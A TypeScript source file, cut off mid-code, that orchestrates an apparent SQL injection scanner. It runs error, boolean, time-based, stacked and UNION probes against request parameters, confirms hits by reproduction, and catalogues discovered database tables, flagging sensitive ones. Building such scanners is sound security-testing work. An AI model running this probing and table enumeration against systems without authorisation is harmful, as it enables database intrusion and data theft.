import {
  ScanTargetConfig,
  SafetyConfig,
  SqlScanFinding,
  DbmsFingerprint,
  WafDetectionResult,
  ScanLogEntry,
  ScanProgress,
  SqlScanReport,
  CandidateParameter,
  SqlScanEvidence,
  CoverageDimension,
  TestExecutionLogItem,
  RecursiveDatabaseCatalog,
  DiscoveredTable,
  ColumnMetadata,
  DbmsType,
} from '../../types/sqlScanner';
import { RequestParser, ParsedHttpRequest } from './RequestParser';
import { SafetyController } from './SafetyController';
import { ErrorTester } from './ErrorTester';
import { BooleanTester } from './BooleanTester';
import { TimeBasedTester } from './TimeBasedTester';
import { UnionTester } from './UnionTester';
import { StackedTester } from './StackedTester';
import { SecondOrderTester } from './SecondOrderTester';
import { OobManager } from './OobManager';
import { ContextDetector } from './ContextDetector';
import { MetadataExtractor } from './MetadataExtractor';
import { DATABASE_ADAPTERS } from './DatabaseAdapters';
import { ConfidenceEngine } from './ConfidenceEngine';
import { WafDetector } from './WafDetector';
import { ReportGenerator } from './ReportGenerator';
import { EvidenceCorrelator } from './EvidenceCorrelator';
import { AdaptivePayloadEngine } from './AdaptivePayloadEngine';
import { ipcClient } from '../../ipc/client';
import { ConcurrentExecutor } from './engine/ConcurrentExecutor';
import { HypothesisEngine } from './engine/HypothesisEngine';
import { AdaptiveTestPlanner } from './engine/AdaptiveTestPlanner';
import { DialectCompiler } from './engine/DialectCompiler';
import { MultiOracleEvaluator } from './engine/MultiOracleEvaluator';
import { CausalVerifier } from './engine/CausalVerifier';
import { EarlyStoppingPolicy } from './engine/EarlyStoppingPolicy';

export type LogCallback = (entry: ScanLogEntry) => void;
export type ProgressCallback = (progress: ScanProgress) => void;
export type FindingCallback = (finding: SqlScanFinding) => void;
export type ExecutionLogCallback = (log: TestExecutionLogItem) => void;
export type CatalogCallback = (catalog: RecursiveDatabaseCatalog) => void;

export class SqlScanOrchestrator {
  private target: ScanTargetConfig;
  private safetyConfig: SafetyConfig;
  private safety: SafetyController;
  private onLog: LogCallback;
  private onProgress: ProgressCallback;
  private onFinding: FindingCallback;
  private onExecutionLog?: ExecutionLogCallback;
  private onCatalog?: CatalogCallback;

  public engineMode: 'ucmax_causal' | 'bayesian_adaptive' | 'sprt_timing' | 'standard' = 'ucmax_causal';
  public concurrentExecutor: ConcurrentExecutor;

  private isAborted = false;
  private isPaused = false;
  private requestsSent = 0;
  private testsExecuted = 0;
  private startTime = 0;
  private findings: SqlScanFinding[] = [];
  private executionLogs: TestExecutionLogItem[] = [];
  private coverageMap: Map<string, CoverageDimension> = new Map();
  private executedPayloadFingerprints: Set<string> = new Set();

  private dbmsFingerprint: DbmsFingerprint = {
    dbms: 'Unknown',
    confidence: 'Informational',
    confidenceScore: 0,
    evidence: [],
  };
  private wafResult: WafDetectionResult = {
    detected: false,
    confidence: 'Informational',
    evidence: [],
  };
  private catalog: RecursiveDatabaseCatalog = {
    dbms: 'Unknown',
    schemas: [],
    applicationTables: [],
    systemTables: [],
    discoveredAt: Date.now(),
  };

  constructor(
    target: ScanTargetConfig,
    safetyConfig: SafetyConfig,
    callbacks: {
      onLog: LogCallback;
      onProgress: ProgressCallback;
      onFinding: FindingCallback;
      onExecutionLog?: ExecutionLogCallback;
      onCatalog?: CatalogCallback;
    },
    engineMode: 'ucmax_causal' | 'bayesian_adaptive' | 'sprt_timing' | 'standard' = 'ucmax_causal',
    concurrencyLimit: number = 10
  ) {
    this.target = target;
    this.safetyConfig = safetyConfig;
    this.safety = new SafetyController(safetyConfig);
    this.onLog = callbacks.onLog;
    this.onProgress = callbacks.onProgress;
    this.onFinding = callbacks.onFinding;
    this.onExecutionLog = callbacks.onExecutionLog;
    this.onCatalog = callbacks.onCatalog;
    this.engineMode = engineMode;
    this.concurrentExecutor = new ConcurrentExecutor(concurrencyLimit, 50);

    this.initCoverageDimensions();
  }

  private initCoverageDimensions(): void {
    const dims: CoverageDimension[] = [
      { key: 'param_discovery', name: 'Parameter Discovery', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'context_detection', name: 'Context Detection', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'error_sqli', name: 'Error-Based SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'boolean_sqli', name: 'Boolean-Based SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'time_sqli', name: 'Time-Based Blind SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'union_sqli', name: 'UNION-Based SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'order_by', name: 'ORDER BY Column Discovery', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'stacked_sqli', name: 'Stacked Query SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'second_order', name: 'Second-Order SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'oob_sqli', name: 'Out-of-Band (OAST)', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'fingerprinting', name: 'DBMS Fingerprinting', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'version_detection', name: 'Version Detection', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'metadata_analysis', name: 'Metadata & Schema Analysis', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'waf_analysis', name: 'WAF & Filter Analysis', status: 'pending', testedCount: 0, positiveCount: 0 },
    ];
    for (const d of dims) {
      this.coverageMap.set(d.key, d);
    }
  }

  private updateCoverage(key: string, updates: Partial<CoverageDimension>): void {
    const curr = this.coverageMap.get(key);
    if (curr) {
      this.coverageMap.set(key, { ...curr, ...updates });
    }
  }

  public abort(): void {
    this.isAborted = true;
    this.log('warn', 'aborted', 'Scan abort requested by operator. Terminating testing threads...');
  }

  public pause(): void {
    this.isPaused = true;
    this.log('info', 'paused', 'Scan paused by operator.');
  }

  public resume(): void {
    this.isPaused = false;
    this.log('info', 'resumed', 'Scan resumed.');
  }

  private async waitIfPaused(): Promise<void> {
    while (this.isPaused && !this.isAborted) {
      await new Promise((r) => setTimeout(r, 200));
    }
  }

  private log(
    level: 'info' | 'warn' | 'error' | 'success' | 'probe',
    phase: string,
    message: string,
    details?: string,
    payload?: string,
    targetParameter?: string
  ): void {
    const entry: ScanLogEntry = {
      id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
      timestamp: Date.now(),
      level,
      phase,
      message,
      details,
      payload,
      targetParameter,
    };
    this.onLog(entry);
  }

  private logExecution(
    paramName: string,
    technique: string,
    context: string,
    payload: string,
    status: 'positive' | 'negative' | 'error' | 'timeout' | 'skipped' | 'passed',
    durationMs: number,
    evidenceSnippet?: string,
    rawRequest?: string,
    rawResponse?: string
  ): void {
    this.testsExecuted++;
    const item: TestExecutionLogItem = {
      id: `tlog_${Date.now()}_${this.testsExecuted}`,
      testIndex: this.testsExecuted,
      parameterName: paramName,
      technique,
      context,
      dbms: this.dbmsFingerprint.dbms,
      payload,
      status,
      evidenceSnippet,
      durationMs,
      timestamp: Date.now(),
      rawRequest,
      rawResponse,
    };
    this.executionLogs.push(item);
    if (this.onExecutionLog) {
      this.onExecutionLog(item);
    }
  }

  private emitProgressiveCatalog(
    appNames: string[],
    sysNames: string[],
    injectableParam: CandidateParameter | null,
    columnCount: number,
    renderColumn: number
  ): void {
    const appTables: DiscoveredTable[] = appNames.map((tName) => {
      const sensitivity = MetadataExtractor.isSensitiveName(tName);
      return {
        id: `tbl_${tName}`, name: tName, classification: 'application' as const,
        columns: [], isSensitive: sensitivity.isSensitive, sensitivityReason: sensitivity.reason,
        discoveredAt: Date.now(), status: 'discovered' as const,
      };
    });
    const sysTables: DiscoveredTable[] = sysNames.map((tName) => ({
      id: `tbl_${tName}`, name: tName, classification: 'system' as const,
      columns: [], isSensitive: false, discoveredAt: Date.now(), status: 'discovered' as const,
    }));
    this.catalog = {
      dbms: this.dbmsFingerprint.dbms,
      version: this.dbmsFingerprint.version,
      columnCount, renderColumn,
      injectableParamName: injectableParam?.name,
      schemas: [{ name: 'CURRENT_SCHEMA', classification: 'application', tables: appTables, views: [], isExpanded: true, discoveredAt: Date.now() }],
      applicationTables: appTables,
      systemTables: sysTables,
      discoveredAt: Date.now(),
    };
    if (this.onCatalog) this.onCatalog(this.catalog);
  }

  private updateProgress(phase: any, phaseLabel: string, percent: number, currentParam?: string, totalParams = 1, testedParams = 0): void {
    const progress: ScanProgress = {
      phase,
      phaseLabel,
      totalParameters: totalParams,
      testedParameters: testedParams,
      currentParameter: currentParam,
      requestsSent: this.requestsSent,
      testsExecuted: this.testsExecuted,
      findingsCount: this.findings.length,
      confirmedIndicators: this.findings.reduce((a, f) => a + f.evidence.length, 0),
      percent: Math.min(100, Math.max(0, percent)),
      startTime: this.startTime,
      durationMs: Date.now() - this.startTime,
      isPaused: this.isPaused,
      isAborted: this.isAborted,
    };
    this.onProgress(progress);
  }

  /**
   * Dispatches an HTTP request through the Sentinel network engine
   */
  public async executeProbe(
    parsed: ParsedHttpRequest,
    param: CandidateParameter | null,
    payload: string,
    append = false
  ): Promise<{ status: number; body: string; headers: { name: string; value: string }[]; durationMs: number; rawRequest: string; rawResponse: string }> {
    await this.waitIfPaused();
    if (this.isAborted) {
      throw new Error('Scan aborted by user');
    }

    // Deduplication check
    const fp = `${param?.id || 'base'}_${payload}`;
    this.executedPayloadFingerprints.add(fp);

    this.safety.validateProbe(payload);
    await this.safety.throttle();

    let reqData: { rawRequest: string; targetUrl: string; bodyText: string; headers: { name: string; value: string }[] };
    if (param) {
      reqData = RequestParser.injectPayload(parsed, param, payload, append);
    } else {
      reqData = {
        rawRequest: parsed.body ? `${parsed.method} ${parsed.path} ${parsed.protocol}\r\n${parsed.headers.map((h) => `${h.name}: ${h.value}`).join('\r\n')}\r\n\r\n${parsed.body}` : `${parsed.method} ${parsed.path} ${parsed.protocol}\r\n${parsed.headers.map((h) => `${h.name}: ${h.value}`).join('\r\n')}\r\n\r\n`,
        targetUrl: parsed.url,
        bodyText: parsed.body,
        headers: parsed.headers,
      };
    }

    const tStart = Date.now();
    try {
      const execResult = await ipcClient.sendRepeaterRequest({
        tabId: 'sql_scanner_probe',
        targetUrl: reqData.targetUrl,
        rawRequest: reqData.rawRequest,
      });

      this.requestsSent++;
      this.safety.recordResponseSuccess();

      const durationMs = execResult.durationMs || (Date.now() - tStart);
      const statusCode = execResult.statusCode || 200;
      const rawResBody = execResult.body || '';
      const sanitizedBody = this.safety.redactSensitiveOutput(rawResBody);
      const sanitizedRawRes = this.safety.redactSensitiveOutput(execResult.rawResponse || `HTTP/1.1 ${statusCode}\r\n\r\n${sanitizedBody}`);

      return {
        status: statusCode,
        body: sanitizedBody,
        headers: (execResult.headers || []).map((h) => ({ name: h.name, value: h.value })),
        durationMs,
        rawRequest: reqData.rawRequest,
        rawResponse: sanitizedRawRes,
      };
    } catch (err: any) {
      this.requestsSent++;
      this.safety.recordResponseError();
      const durationMs = Date.now() - tStart;
      this.log('error', 'probe', `Probe network transmission failed: ${err?.message || err}`, undefined, payload, param?.name);
      return {
        status: 0,
        body: '',
        headers: [],
        durationMs,
        rawRequest: reqData.rawRequest,
        rawResponse: `HTTP/1.1 0 Connection Error\r\n\r\n${err?.message || 'Socket error'}`,
      };
    }
  }

  /**
   * Hard-gated 3x reproduction verification loop before confirming any vulnerability
   */
  private async verifyReproduction(
    parsed: ParsedHttpRequest,
    param: CandidateParameter,
    payload: string,
    checkFn: (res: { status: number; body: string; durationMs: number }) => boolean
  ): Promise<{ success: boolean; successRate: string }> {
    let positiveCount = 0;
    const totalTries = 3;

    for (let t = 0; t < totalTries; t++) {
      if (this.isAborted) break;
      const res = await this.executeProbe(parsed, param, payload, true);
      if (checkFn(res)) {
        positiveCount++;
      }
    }

    return {
      success: positiveCount === totalTries,
      successRate: `${positiveCount}/${totalTries}`,
    };
  }

  /**
   * Main scan execution entrypoint
   */
  public async startScan(): Promise<SqlScanReport> {
    this.startTime = Date.now();
    this.isAborted = false;
    this.isPaused = false;
    this.requestsSent = 0;
    this.testsExecuted = 0;
    this.findings = [];
    this.executionLogs = [];
    this.executedPayloadFingerprints.clear();
    this.initCoverageDimensions();

    this.log('info', 'authorizing', 'Initiating Sentinel SQL X Security Assessment Engine...');
    this.safety.initScan();

    // 1. Parse Request & Candidate Parameters
    this.updateProgress('parsing', 'Parsing HTTP Request & Candidate Vectors', 5);
    const parsed = RequestParser.parse(this.target.rawRequest, this.target.url);
    const enabledParams = (this.target.parameters.length > 0 ? this.target.parameters : parsed.parameters).filter(
      (p) => p.enabled
    );

    this.updateCoverage('param_discovery', {
      status: enabledParams.length > 0 ? 'passed' : 'skipped',
      testedCount: enabledParams.length,
      positiveCount: enabledParams.length,
    });

    if (enabledParams.length === 0) {
      this.log('warn', 'parsing', 'No candidate parameters found in target request.');
    } else {
      this.log(
        'info',
        'parsing',
        `Discovered ${enabledParams.length} candidate parameter(s) across query/body/headers/cookies/path for active testing.`,
        enabledParams.map((p) => `${p.name} (${p.location})`).join(', ')
      );
    }

    // 2. Context Detection
    this.updateProgress('context_detection', 'Detecting Parameter SQL Injection Contexts', 8);
    for (const p of enabledParams) {
      p.detectedContext = ContextDetector.detectContext(p, this.target.rawRequest);
      this.log('info', 'context_detection', `Parameter "${p.name}": Detected context [${p.detectedContext}]`);
    }
    this.updateCoverage('context_detection', { status: 'passed', testedCount: enabledParams.length, positiveCount: enabledParams.length });

    // 3. Multi-Sample Baseline Traffic (Mean, Median, Standard Deviation)
    this.updateProgress('baseline', 'Capturing Multi-Sample Baseline Traffic & Measuring Jitter', 10);
    this.log('info', 'baseline', `Establishing target baseline responses against ${parsed.url}...`);

    const baseline1 = await this.executeProbe(parsed, null, '');
    const baseline2 = await this.executeProbe(parsed, null, '');
    const baseline3 = await this.executeProbe(parsed, null, '');
    const baselineDurations = [baseline1.durationMs, baseline2.durationMs, baseline3.durationMs];
    const timingStats = TimeBasedTester.computeTimingStats(baselineDurations);
    const baselineBody = baseline1.body || baseline2.body;
    const baselineStatus = baseline1.status || baseline2.status;

    this.log(
      'info',
      'baseline',
      `Baseline established: HTTP ${baselineStatus}, Length: ${baselineBody.length}B, Mean latency: ${timingStats.mean.toFixed(0)}ms (Ïƒ = ${timingStats.stdDev.toFixed(1)}ms)`
    );

    // 4. WAF & Defensive Filter Detection
    this.updateProgress('waf_check', 'Detecting Web Application Firewall (WAF)', 14);
    this.wafResult = WafDetector.inspect(baseline1.headers, baselineBody, baselineStatus);
    if (this.wafResult.detected) {
      this.log('warn', 'waf_check', `Defensive layer detected: ${this.wafResult.wafName} (${this.wafResult.confidence} confidence)`, this.wafResult.evidence.join('; '));
    } else {
      this.log('info', 'waf_check', 'No defensive WAF block signatures detected on baseline response.');
    }
    this.updateCoverage('waf_analysis', {
      status: this.wafResult.detected ? 'vulnerable' : 'passed',
      testedCount: 1,
      positiveCount: this.wafResult.detected ? 1 : 0,
      reason: this.wafResult.detected ? `WAF Active: ${this.wafResult.wafName}` : 'Direct connection',
    });

    // 5. Test Each Candidate Parameter Individually
    const totalParams = enabledParams.length;
    let testedCount = 0;
    let confirmedRenderColumn = 1;
    let confirmedColumnCount = 0;
    let confirmedInjectableParam: CandidateParameter | null = null;
    let confirmedTrueMarker = '';

    for (const param of enabledParams) {
      if (this.isAborted) break;

      testedCount++;
      const basePercent = 18 + Math.round((testedCount / (totalParams || 1)) * 55);

      this.log('info', 'testing', `[Parameter ${testedCount}/${totalParams}] Testing parameter: "${param.name}" (${param.location}, Context: ${param.detectedContext}) [Engine Mode: ${this.engineMode}]`, undefined, undefined, param.name);

      const hypothesis = new HypothesisEngine(param, this.dbmsFingerprint.dbms);
      const initialBelief = hypothesis.getBeliefState();
      this.log('info', 'testing', `Bayesian Prior: Context="${initialBelief.mostLikelyContext}" (Entropy: ${initialBelief.contextEntropy.toFixed(2)}b), DBMS="${initialBelief.mostLikelyDbms}", VulnProb=${(initialBelief.vulnerabilityProbability * 100).toFixed(0)}%`, undefined, undefined, param.name);

      let paramIsVulnerable = false;
      const paramEvidenceList: SqlScanEvidence[] = [];

      // A. Error-Based Testing
      if (this.target.testedInjectionTypes.errorBased && !this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        this.updateProgress('error_testing', `Error-based probing: ${param.name}`, basePercent - 4, param.name, totalParams, testedCount);
        const errorProbes = this.safetyConfig.scanMode === 'quick'
          ? ErrorTester.getPrecisionErrorProbes().slice(0, 3)
          : ErrorTester.getPrecisionErrorProbes();

        for (const probe of errorProbes) {
          if (this.isAborted) break;
          const res = await this.executeProbe(parsed, param, probe.payload, true);
          const errorMatch = ErrorTester.analyzeResponse(res.body);

          if (errorMatch) {
            // Hard-gated reproduction
            const repro = await this.verifyReproduction(parsed, param, probe.payload, (r) => !!ErrorTester.analyzeResponse(r.body));

            if (repro.success) {
              paramIsVulnerable = true;
              confirmedInjectableParam = param;
              this.dbmsFingerprint = {
                dbms: errorMatch.dbms,
                confidence: 'High',
                confidenceScore: 90,
                evidence: [`Matched error signature: "${errorMatch.patternName}" (${errorMatch.matchedText})`],
              };

              const ev: SqlScanEvidence = {
                id: `ev_err_${Date.now()}`,
                title: `Error-based SQLi: ${errorMatch.patternName}`,
                timestamp: Date.now(),
                injectionType: 'Error-based',
                parameterName: param.name,
                parameterLocation: param.location,
                payload: probe.payload,
                baselineStatus,
                baselineLength: baselineBody.length,
                baselineDurationMs: timingStats.median,
                testStatus: res.status,
                testLength: res.body.length,
                testDurationMs: res.durationMs,
                rawRequest: res.rawRequest,
                rawResponse: res.rawResponse,
                matchedPattern: errorMatch.matchedText,
                reproductionCount: 3,
                reproductionSuccessRate: repro.successRate,
                analysisSummary: `Direct database error identified: ${errorMatch.patternName} (${errorMatch.dbms}) [Reproduced ${repro.successRate}]`,
              };
              paramEvidenceList.push(ev);

              this.logExecution(param.name, 'Error-based SQLi', param.detectedContext || 'string', probe.payload, 'positive', res.durationMs, errorMatch.matchedText, res.rawRequest, res.rawResponse);
              this.updateCoverage('error_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('error_sqli')?.testedCount || 0) + 1, positiveCount: 1 });

              this.log(
                'success',
                'error_testing',
                `SQL syntax error detected in "${param.name}": ${errorMatch.patternName} (${errorMatch.dbms}) [Confirmed ${repro.successRate}]`,
                errorMatch.matchedText,
                probe.payload,
                param.name
              );
              break;
            }
          } else {
            this.logExecution(param.name, 'Error-based SQLi', param.detectedContext || 'string', probe.payload, 'negative', res.durationMs, undefined, res.rawRequest, res.rawResponse);
          }
        }
      }

      // B. Boolean Differential Testing
      if (this.target.testedInjectionTypes.booleanBased && !this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        this.updateProgress('boolean_testing', `Boolean differential testing: ${param.name}`, basePercent - 2, param.name, totalParams, testedCount);
        const booleanPairs = this.safetyConfig.scanMode === 'quick'
          ? BooleanTester.getTestPairs(param).slice(0, 5)
          : BooleanTester.getTestPairs(param);

        for (const pair of booleanPairs) {
          if (this.isAborted) break;
          const trueRes = await this.executeProbe(parsed, param, pair.truePayload, true);
          const falseRes = await this.executeProbe(parsed, param, pair.falsePayload, true);

          const boolResult = BooleanTester.evaluateDifferential(
            baselineBody,
            baselineStatus,
            trueRes.body,
            trueRes.status,
            falseRes.body,
            falseRes.status,
            pair.truePayload,
            pair.falsePayload
          );

          if (boolResult.isVulnerable) {
            // Hard-gated reproduction
            const repro = await this.verifyReproduction(parsed, param, pair.truePayload, (r) => {
              const sim = BooleanTester.evaluateDifferential(
                baselineBody,
                baselineStatus,
                r.body,
                r.status,
                falseRes.body,
                falseRes.status,
                pair.truePayload,
                pair.falsePayload
              );
              return sim.isVulnerable;
            });

            if (repro.success) {
              paramIsVulnerable = true;
              confirmedInjectableParam = param;
              confirmedTrueMarker = boolResult.uniqueMarker || '';

              if (this.engineMode === 'ucmax_causal') {
                this.log('info', 'testing', `Initiating UCMA-X 5-Step Counterfactual Causal Verification on "${param.name}"...`);
                await CausalVerifier.verifyCausality(
                  param,
                  async (p, app) => this.executeProbe(parsed, param, p, app),
                  pair.truePayload,
                  pair.falsePayload,
                  (evt) => {
                    this.log(evt.state === 'passed' ? 'success' : evt.state === 'failed' ? 'warn' : 'info', 'testing', `[Causal Step ${evt.stepIndex}/5: ${evt.stepName}] ${evt.description}`);
                  }
                );
              }

              if (pair.dbms && pair.dbms !== 'Generic SQL' && (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL')) {
                this.dbmsFingerprint = {
                  dbms: pair.dbms,
                  confidence: 'High',
                  confidenceScore: 90,
                  evidence: [`${pair.dbms} specific boolean condition evaluated TRUE`],
                };
              }
              const ev: SqlScanEvidence = {
                id: `ev_bool_${Date.now()}`,
                title: `Boolean-based differential: ${pair.name}`,
                timestamp: Date.now(),
                injectionType: 'Boolean-based',
                parameterName: param.name,
                parameterLocation: param.location,
                payload: `TRUE: ${pair.truePayload} | FALSE: ${pair.falsePayload}`,
                baselineStatus,
                baselineLength: baselineBody.length,
                baselineDurationMs: timingStats.median,
                testStatus: trueRes.status,
                testLength: trueRes.body.length,
                testDurationMs: trueRes.durationMs,
                rawRequest: trueRes.rawRequest,
                rawResponse: trueRes.rawResponse,
                reproductionCount: 3,
                reproductionSuccessRate: repro.successRate,
                analysisSummary: `${boolResult.evidence} [Reproduced ${repro.successRate}]`,
              };
              paramEvidenceList.push(ev);

              this.logExecution(param.name, 'Boolean-based SQLi', param.detectedContext || 'string', pair.truePayload, 'positive', trueRes.durationMs, boolResult.evidence, trueRes.rawRequest, trueRes.rawResponse);
              this.updateCoverage('boolean_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('boolean_sqli')?.testedCount || 0) + 1, positiveCount: 1 });

              this.log(
                'success',
                'boolean_testing',
                `Boolean differential confirmed on "${param.name}": TRUE matches baseline, FALSE diverges [Confirmed ${repro.successRate}]`,
                undefined,
                pair.truePayload,
                param.name
              );
              break;
            }
          } else {
            this.logExecution(param.name, 'Boolean-based SQLi', param.detectedContext || 'string', pair.truePayload, 'negative', trueRes.durationMs, undefined, trueRes.rawRequest, trueRes.rawResponse);
          }
        }
      }

      // C. Time-Based Blind Testing
      if (this.target.testedInjectionTypes.timeBased && !this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        this.updateProgress('time_testing', `Time-based blind delay verification: ${param.name}`, basePercent, param.name, totalParams, testedCount);
        const delayProbes = TimeBasedTester.getDelayPayloads(param, 3);

        for (const probe of delayProbes) {
          if (this.isAborted) break;
          const timeRes = await this.executeProbe(parsed, param, probe.payload, true);
          const timeResult = TimeBasedTester.evaluateTiming(
            baselineDurations,
            timeRes.durationMs,
            probe.delaySeconds,
            probe.dbms
          );

          if (timeResult.isVulnerable) {
            // Hard-gated reproduction
            const repro = await this.verifyReproduction(parsed, param, probe.payload, (r) => {
              const tRes = TimeBasedTester.evaluateTiming(baselineDurations, r.durationMs, probe.delaySeconds, probe.dbms);
              return tRes.isVulnerable;
            });

            if (repro.success) {
              paramIsVulnerable = true;
              confirmedInjectableParam = param;
              if (this.dbmsFingerprint.dbms === 'Unknown') {
                this.dbmsFingerprint = {
                  dbms: probe.dbms,
                  confidence: 'High',
                  confidenceScore: 85,
                  evidence: [`Time delay execution verified with ${probe.dbms} specific sleep call (${probe.payload})`],
                };
              }

              const ev: SqlScanEvidence = {
                id: `ev_time_${Date.now()}`,
                title: `Time-based SQLi: ${probe.dbms} (${probe.delaySeconds}s delay)`,
                timestamp: Date.now(),
                injectionType: 'Time-based',
                parameterName: param.name,
                parameterLocation: param.location,
                payload: probe.payload,
                baselineStatus,
                baselineLength: baselineBody.length,
                baselineDurationMs: timingStats.median,
                testStatus: timeRes.status,
                testLength: timeRes.body.length,
                testDurationMs: timeRes.durationMs,
                rawRequest: timeRes.rawRequest,
                rawResponse: timeRes.rawResponse,
                reproductionCount: 3,
                reproductionSuccessRate: repro.successRate,
                analysisSummary: `${timeResult.evidence} [Reproduced ${repro.successRate}]`,
              };
              paramEvidenceList.push(ev);

              this.logExecution(param.name, 'Time-Based Blind SQLi', param.detectedContext || 'string', probe.payload, 'positive', timeRes.durationMs, timeResult.evidence, timeRes.rawRequest, timeRes.rawResponse);
              this.updateCoverage('time_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('time_sqli')?.testedCount || 0) + 1, positiveCount: 1 });

              this.log(
                'success',
                'time_testing',
                `Time-based SQL delay confirmed on "${param.name}" using ${probe.dbms} sleep [Confirmed ${repro.successRate}]`,
                undefined,
                probe.payload,
                param.name
              );
              break;
            }
          } else {
            this.logExecution(param.name, 'Time-Based Blind SQLi', param.detectedContext || 'string', probe.payload, 'negative', timeRes.durationMs, undefined, timeRes.rawRequest, timeRes.rawResponse);
          }
        }
      }

      // D. Stacked Queries Testing
      if (this.target.testedInjectionTypes.stackedBased && !this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        this.updateProgress('stacked_testing', `Stacked multi-query testing: ${param.name}`, basePercent + 2, param.name, totalParams, testedCount);
        const stackedProbes = StackedTester.getStackedProbes(param, 3);

        for (const sp of stackedProbes) {
          if (this.isAborted) break;
          const sRes = await this.executeProbe(parsed, param, sp.payload, true);
          const stkResult = StackedTester.evaluateStackedResult(baselineDurations, sRes.durationMs, sp);

          if (stkResult.isVulnerable) {
            paramIsVulnerable = true;
            confirmedInjectableParam = param;

            const ev: SqlScanEvidence = {
              id: `ev_stacked_${Date.now()}`,
              title: `Stacked Query SQLi: Semicolon multi-statement execution (${sp.dbms})`,
              timestamp: Date.now(),
              injectionType: 'Stacked-query indicator',
              parameterName: param.name,
              parameterLocation: param.location,
              payload: sp.payload,
              baselineStatus,
              baselineLength: baselineBody.length,
              baselineDurationMs: timingStats.median,
              testStatus: sRes.status,
              testLength: sRes.body.length,
              testDurationMs: sRes.durationMs,
              rawRequest: sRes.rawRequest,
              rawResponse: sRes.rawResponse,
              reproductionCount: 1,
              analysisSummary: stkResult.evidence,
            };
            paramEvidenceList.push(ev);

            this.logExecution(param.name, 'Stacked Query SQLi', param.detectedContext || 'string', sp.payload, 'positive', sRes.durationMs, stkResult.evidence, sRes.rawRequest, sRes.rawResponse);
            this.updateCoverage('stacked_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('stacked_sqli')?.testedCount || 0) + 1, positiveCount: 1 });
            this.log('success', 'stacked_testing', `Stacked multi-query execution confirmed on "${param.name}": ${stkResult.evidence}`);
            break;
          } else {
            this.logExecution(param.name, 'Stacked Query SQLi', param.detectedContext || 'string', sp.payload, 'negative', sRes.durationMs, undefined, sRes.rawRequest, sRes.rawResponse);
          }
        }
      }

      // E. Adaptive ORDER BY & NULL-based UNION Canary Injection
      // ALWAYS attempt UNION detection — it enables information_schema extraction which is far more powerful than blind probing
      if (this.target.testedInjectionTypes.unionBased && !this.isAborted) {
        this.updateProgress('union_testing', `UNION & Column Detection: ${param.name}`, basePercent + 4, param.name, totalParams, testedCount);
        let determinedColumns = 0;

        // Step 1: ORDER BY Column Count Probing
        const orderProbes = UnionTester.getOrderByProbes(param, 12);
        for (let i = 0; i < orderProbes.length; i++) {
          if (this.isAborted) break;
          const p = orderProbes[i];
          const ordRes = await this.executeProbe(parsed, param, p.payload, true);
          if (ordRes.status === baselineStatus && Math.abs(ordRes.body.length - baselineBody.length) < 80) {
            determinedColumns = p.columnCount;
            this.logExecution(param.name, 'ORDER BY Column Probe', param.detectedContext || 'string', p.payload, 'passed', ordRes.durationMs, `Column count >= ${p.columnCount}`, ordRes.rawRequest, ordRes.rawResponse);
          } else {
            this.logExecution(param.name, 'ORDER BY Column Probe', param.detectedContext || 'string', p.payload, 'negative', ordRes.durationMs, `Column index ${p.columnCount} out of bounds`, ordRes.rawRequest, ordRes.rawResponse);
            break;
          }
        }

        // Step 2: NULL-Based UNION Probing Fallback
        if (determinedColumns === 0) {
          const nullProbes = UnionTester.getNullUnionProbes(param, 10);
          for (const np of nullProbes) {
            if (this.isAborted) break;
            const nRes = await this.executeProbe(parsed, param, np.payload, true);
            if (nRes.status === baselineStatus && Math.abs(nRes.body.length - baselineBody.length) < 150) {
              determinedColumns = np.columnCount;
              if (np.dbms === 'Oracle') {
                this.dbmsFingerprint = {
                  dbms: 'Oracle',
                  confidence: 'High',
                  confidenceScore: 90,
                  evidence: ['Successful UNION SELECT NULL FROM DUAL response'],
                };
              }
              this.logExecution(param.name, 'NULL UNION Column Probe', param.detectedContext || 'string', np.payload, 'passed', nRes.durationMs, `Confirmed ${np.columnCount} columns (${np.dbms})`, nRes.rawRequest, nRes.rawResponse);
              break;
            } else {
              this.logExecution(param.name, 'NULL UNION Column Probe', param.detectedContext || 'string', np.payload, 'negative', nRes.durationMs, undefined, nRes.rawRequest, nRes.rawResponse);
            }
          }
        }

        if (determinedColumns >= 1) {
          confirmedColumnCount = determinedColumns;
          this.updateCoverage('order_by', { status: 'passed', testedCount: determinedColumns, positiveCount: determinedColumns, reason: `${determinedColumns} columns verified` });
          this.log('info', 'union_testing', `Estimated query column count for "${param.name}": ${determinedColumns} column(s)`);

          // Step 3: Per-Column String Compatibility Canary Probing
          const perColProbes = UnionTester.getPerColumnCanaryProbes(param, determinedColumns);
          for (const cProbe of perColProbes) {
            if (this.isAborted) break;
            const uRes = await this.executeProbe(parsed, param, cProbe.payload, true);
            if (uRes.body.includes(cProbe.canaryMarker)) {
              paramIsVulnerable = true;
              confirmedInjectableParam = param;
              confirmedRenderColumn = cProbe.targetColumnIndex;

              if (cProbe.dbms && (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL')) {
                this.dbmsFingerprint = {
                  dbms: cProbe.dbms,
                  confidence: 'High',
